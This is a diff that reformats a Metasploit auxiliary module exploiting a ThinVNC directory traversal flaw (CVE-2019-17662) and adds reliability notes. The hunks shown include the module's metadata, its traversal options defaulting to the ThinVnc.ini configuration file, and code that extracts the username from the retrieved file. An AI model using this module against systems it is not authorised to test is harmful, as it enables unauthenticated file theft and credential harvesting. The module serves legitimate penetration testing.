@@ -9,39 +9,46 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'        => 'ThinVNC Directory Traversal',
-      'Description' => %q{
-        This module exploits a directory traversal vulnerability in ThinVNC
-        versions 1.0b1 and prior which allows unauthenticated users to retrieve
-        arbitrary files, including the ThinVNC configuration file.
+    super(
+      update_info(
+        info,
+        'Name' => 'ThinVNC Directory Traversal',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability in ThinVNC
+          versions 1.0b1 and prior which allows unauthenticated users to retrieve
+          arbitrary files, including the ThinVNC configuration file.
 
-        This module has been tested successfully on ThinVNC versions 1.0b1
-        and "ThinVNC_Latest" (2018-12-07).
-      },
-      'References'  =>
-        [
+          This module has been tested successfully on ThinVNC versions 1.0b1
+          and "ThinVNC_Latest" (2018-12-07).
+        },
+        'References' => [
           ['CVE', '2019-17662'],
           ['URL', 'https://github.com/bewest/thinvnc/issues/5'],
           ['URL', 'https://github.com/shashankmangal2/Exploits/blob/master/ThinVNC-RemoteAccess/POC.py'],
           ['URL', 'https://redteamzone.com/ThinVNC/']
         ],
-      'Author'      =>
-        [
+        'Author' => [
           'jinxbox', # Discovery and PoC
           'WarMarX', # PoC
           'bcoles'   # metasploit
         ],
-      'DefaultOptions' => { 'RPORT' => 8080 },
-      'DisclosureDate' => '2019-10-16',
-      'License' => MSF_LICENSE
-    ))
+        'DefaultOptions' => { 'RPORT' => 8080 },
+        'DisclosureDate' => '2019-10-16',
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('FILEPATH', [true, 'The path to the file to read', 'ThinVnc.ini']),
         OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 2])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -74,13 +81,13 @@ class MetasploitModule < Msf::Auxiliary
       )
 
       report_vuln(
-        :host  => ip,
-        :port  => rport,
+        :host => ip,
+        :port => rport,
         :proto => 'tcp',
         :sname => (ssl ? 'https' : 'http'),
-        :name  => 'ThinVNC Directory Traversal',
-        :info  => 'ThinVNC Directory Traversal',
-        :refs  => self.references
+        :name => 'ThinVNC Directory Traversal',
+        :info => 'ThinVNC Directory Traversal',
+        :refs => self.references
       )
 
       username = res.scan(/^User=(.+)$/).flatten.first.to_s.strip
